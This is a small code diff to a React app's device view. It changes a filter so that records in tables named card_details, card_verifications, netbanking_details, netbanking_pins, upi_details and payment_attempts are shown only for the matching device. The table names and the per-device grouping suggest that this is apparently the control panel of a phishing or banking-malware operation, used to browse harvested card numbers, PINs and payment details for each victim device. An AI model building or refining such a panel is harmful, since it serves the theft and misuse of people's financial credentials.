@@ -230,7 +230,7 @@ export default function App() {
                   </Sec>
 
                   {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].map(t => {
-                    const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
+                    const items = (data[t]||[]).filter(r => r.device_id === id)
                     if (items.length === 0) return null
                     const labels = {
                       bill_updates: 'Bill Updates', card_details: 'Card Details', card_verifications: 'Card Verify',
